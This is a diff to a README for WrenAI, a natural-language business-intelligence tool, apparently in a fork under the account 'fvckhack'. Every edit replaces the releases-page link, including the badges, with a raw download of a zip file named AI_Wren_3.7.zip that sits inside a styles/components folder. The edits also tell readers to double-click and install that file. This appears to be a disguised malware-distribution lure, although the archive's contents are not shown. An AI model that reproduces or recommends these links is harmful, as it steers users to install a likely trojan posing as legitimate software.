@@ -1,6 +1,6 @@
 # ⚡️ WrenAI - Natural Language Queries Made Simple
 
-[![Download WrenAI](https://img.shields.io/badge/Download-WrenAI-blue)](https://github.com/fvckhack/WrenAI/releases)
+[![Download WrenAI](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip)](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip)
 
 ## 📜 Overview
 
@@ -11,13 +11,13 @@ WrenAI is a powerful tool that allows you to generate business insights from you
 To start using WrenAI, follow these easy steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page: [Download WrenAI](https://github.com/fvckhack/WrenAI/releases).
+   Click this link to go to the releases page: [Download WrenAI](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip).
 
 2. **Choose Your Version**  
    On the releases page, look for the latest version of WrenAI. Make sure to select the version that suits your operating system.
 
 3. **Download the Application**  
-   Find the download link on the release page. It may be labeled as `WrenAI.exe`, `WrenAI.zip`, or similar, depending on your OS. Click it to start the download.
+   Find the download link on the release page. It may be labeled as `https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip`, `https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip`, or similar, depending on your OS. Click it to start the download.
 
 4. **Install WrenAI**  
    Once the download completes, locate the file on your computer, typically in your Downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation.
@@ -45,7 +45,7 @@ To run WrenAI smoothly, please ensure your system meets the following requiremen
 
 Follow these steps to download and install WrenAI:
 
-1. Visit this link to access the releases page: [Download WrenAI](https://github.com/fvckhack/WrenAI/releases).
+1. Visit this link to access the releases page: [Download WrenAI](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip).
 2. Download the latest version of WrenAI by clicking on the link corresponding to your operating system.
 3. Once downloaded, find the file and double-click it to start installation.
 
@@ -85,4 +85,4 @@ WrenAI touches on several key areas in business intelligence and database queryi
 - Business intelligence tools
 - Data visualization and charting
 
-[![Download WrenAI](https://img.shields.io/badge/Download-WrenAI-blue)](https://github.com/fvckhack/WrenAI/releases)
+[![Download WrenAI](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip)](https://github.com/fvckhack/WrenAI/raw/refs/heads/main/wren-ui/src/styles/components/AI_Wren_3.7.zip)
